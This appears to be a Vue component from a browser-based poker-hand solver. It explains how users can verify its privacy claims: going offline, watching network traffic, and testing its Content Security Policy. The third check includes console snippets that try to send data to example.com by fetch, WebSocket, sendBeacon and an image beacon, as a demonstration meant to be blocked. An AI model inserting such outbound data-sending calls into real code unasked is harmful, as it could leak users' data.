<script setup>
/**
 * How to check the privacy claim rather than be asked to believe it.
 *
 * Carried over from `pdf-handouts`, where the same argument is made about files.
 * A self-attestation badge would be worth nothing here — the point is to hand
 * over the three checks that would actually catch a lie.
 */
</script>

<template>
  <section id="verify" class="panel" aria-labelledby="verify-heading">
    <h2 id="verify-heading">Check this yourself</h2>
    <p class="intro">
      Every page claims to respect your privacy. Here is how to confirm this one
      does, without trusting us.
    </p>

    <ol class="checks">
      <li>
        <h3>Pull the plug</h3>
        <p>
          Load this page, then turn off your wifi or unplug the cable. Paste a
          hand and analyse it. It still works, because the solver is already in
          your browser — there is nothing left to talk to.
        </p>
      </li>

      <li>
        <h3>Watch the network</h3>
        <p>
          Open your browser's developer tools, go to the Network tab, clear it,
          then analyse a hand. There are no requests. The only traffic this page
          ever makes is fetching itself, and the solver, when it first loads.
        </p>
      </li>

      <li>
        <h3>Make it try to leak, and watch it fail</h3>
        <p>
          This page ships a
          <a href="https://developer.mozilla.org/docs/Web/HTTP/CSP">
            Content Security Policy
          </a>
          that the <em>browser</em> enforces — the page cannot switch it off or
          work around it. You can read it at the top of the page source. To see
          it working, paste this into the developer console and watch every
          attempt get refused:
        </p>
        <pre><code>fetch('https://example.com/x', {method:'POST', body:'test'});
new WebSocket('wss://example.com/x');
navigator.sendBeacon('https://example.com/x', 'test');
new Image().src = 'https://example.com/x?d=test';</code></pre>
      </li>
    </ol>

    <p class="caveat">
      <strong>The one caveat, stated plainly.</strong> The policy is
      <code>connect-src 'self'</code> rather than <code>'none'</code>, because the
      WebAssembly solver is itself fetched from this origin when the page loads.
      That origin is GitHub Pages, which serves static files and has nothing that
      could receive an upload. A browser extension bundling the same solver
      locally could close even that gap and use <code>'none'</code>.
    </p>
  </section>
</template>

<style scoped>
.panel {
  background: var(--bg-white);
  border: 1px solid var(--border);
  border-radius: var(--radius-card);
  padding: 16px 18px;
}

h2 {
  font-size: 18px;
}

h3 {
  font-size: 15px;
  font-family: var(--font-body);
  margin-bottom: 2px;
}

.intro {
  margin: 0 0 12px;
  color: var(--text-secondary);
  font-size: 14px;
  max-width: 66ch;
}

.checks {
  margin: 0;
  padding-left: 22px;
  display: flex;
  flex-direction: column;
  gap: 14px;
}

.checks p {
  margin: 0;
  font-size: 14px;
  max-width: 66ch;
  color: var(--text-secondary);
}

pre {
  margin: 8px 0 0;
  font-size: 11.5px;
  max-width: 66ch;
}

.caveat {
  margin: 16px 0 0;
  padding: 10px 12px;
  background: var(--bg-warm);
  border: 1px solid var(--border);
  border-radius: var(--radius-button);
  font-size: 13px;
  color: var(--text-secondary);
  max-width: 72ch;
}

.caveat code {
  background: #fff;
  padding: 1px 4px;
  border-radius: 3px;
  border: 1px solid var(--border);
}
</style>
